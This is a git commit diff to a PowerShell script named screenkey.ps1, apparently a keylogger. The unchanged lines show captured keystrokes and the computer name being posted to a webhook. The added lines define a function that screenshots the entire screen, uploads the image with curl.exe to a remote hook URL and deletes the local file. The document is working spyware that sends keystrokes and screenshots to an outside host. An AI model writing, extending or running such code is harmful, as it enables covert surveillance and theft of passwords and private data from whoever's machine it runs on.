91c81f91e93e876e460e1ba6eb5ef538b7e467f4
ElPichiii <90940144+ElPichiii@users.noreply.github.com>
2024-01-05 09:41:17 +0100

    Add files via upload

--- screenkey.ps1
+++ screenkey.ps1
@@ -83,7 +83,24 @@ while ($true) {
             $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
             $jsonsys = @{"username" = "$env:COMPUTERNAME"; "content" = $escmsg} | ConvertTo-Json
             Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-
+		function screenshot {
+		$Filett = "$env:temp\SC.png"
+		Add-Type -AssemblyName System.Windows.Forms
+		Add-type -AssemblyName System.Drawing
+		$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+		$Width = $Screen.Width
+		$Height = $Screen.Height
+		$Left = $Screen.Left
+		$Top = $Screen.Top
+		$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+		$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+		$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+		$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+		Start-Sleep 1
+		curl.exe -F "file1=@$filett" $hookurl
+		Start-Sleep 1
+		Remove-Item -Path $filett
+		}
             $send = ""
             $keyPressed = $false
         }
